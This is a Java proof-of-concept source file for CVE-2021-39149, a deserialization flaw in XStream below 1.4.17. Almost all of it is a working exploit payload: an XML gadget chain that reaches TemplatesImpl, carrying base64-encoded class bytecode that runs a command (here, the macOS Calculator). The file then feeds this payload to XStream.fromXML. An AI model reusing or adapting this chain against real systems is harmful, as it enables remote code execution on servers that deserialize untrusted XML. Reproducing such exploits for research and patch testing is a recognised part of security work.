package org.example;

import com.thoughtworks.xstream.XStream;

/**
 * @author Whoopsunix
 * XStream < 1.4.17
 */
public class CVE_2021_39149 {
    public static void main(String[] args) {
        String payload = "<linked-hash-set>\n" +
                "    <dynamic-proxy>\n" +
                "        <interface>map</interface>\n" +
                "        <handler class='com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl'>\n" +
                "            <classToInvocationHandler class='linked-hash-map'/>\n" +
                "            <defaultHandler class='sun.tracing.NullProvider'>\n" +
                "                <active>true</active>\n" +
                "                <providerType>java.lang.Object</providerType>\n" +
                "                <probes>\n" +
                "                    <entry>\n" +
                "                        <method>\n" +
                "                            <class>java.lang.Object</class>\n" +
                "                            <name>hashCode</name>\n" +
                "                            <parameter-types/>\n" +
                "                        </method>\n" +
                "                        <sun.tracing.dtrace.DTraceProbe>\n" +
                "                            <proxy class='com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl' serialization='custom'>\n" +
                "                                <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>\n" +
                "                                    <default>\n" +
                "                                        <__name>Pwnr</__name>\n" +
                "                                        <__bytecodes>\n" +
                "                                            <byte-array>yv66vgAAADQAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQA1THlzcHNlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAoAQAzeXNwc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNwc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHACoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAsAC0KACsALgEAPS9TeXN0ZW0vQXBwbGljYXRpb25zL0NhbGN1bGF0b3IuYXBwL0NvbnRlbnRzL01hY09TL0NhbGN1bGF0b3IIADABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAyADMKACsANAEADVN0YWNrTWFwVGFibGUBAB95c29zZXJpYWwvUHduZXIxMjk2NjcyNjg4Mzg4NjY2AQAhTHlzb3NlcmlhbC9Qd25lcjEyOTY2NzI2ODgzODg2NjY7ACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAKgAOAAAADAABAAAABQAPADgAAAABABMAFAACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAAMAAOAAAAIAADAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABcAGAACABkAAAAEAAEAGgABABMAGwACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAANQAOAAAAKgAEAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABwAHQACAAAAAQAeAB8AAwAZAAAABAABABoACAApAAsAAQAMAAAAJAADAAIAAAAPpwADAUy4AC8SMbYANVexAAAAAQA2AAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJ</byte-array>\n" +
                "                                            <byte-array>yv66vgAAADQAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNwc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNwc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c3BzZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAOQAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJ</byte-array>\n" +
                "                                        </__bytecodes>\n" +
                "                                        <__transletIndex>-1</__transletIndex>\n" +
                "                                        <__indentNumber>0</__indentNumber>\n" +
                "                                    </default>\n" +
                "                                    <boolean>false</boolean>\n" +
                "                                </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>\n" +
                "                            </proxy>\n" +
                "                            <implementing__method>\n" +
                "                                <class>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</class>\n" +
                "                                <name>getOutputProperties</name>\n" +
                "                                <parameter-types/>\n" +
                "                            </implementing__method>\n" +
                "                        </sun.tracing.dtrace.DTraceProbe>\n" +
                "                    </entry>\n" +
                "                </probes>\n" +
                "            </defaultHandler>\n" +
                "        </handler>\n" +
                "    </dynamic-proxy>\n" +
                "</linked-hash-set>";
        XStream xStream = new XStream();
        xStream.fromXML(payload);
    }
}
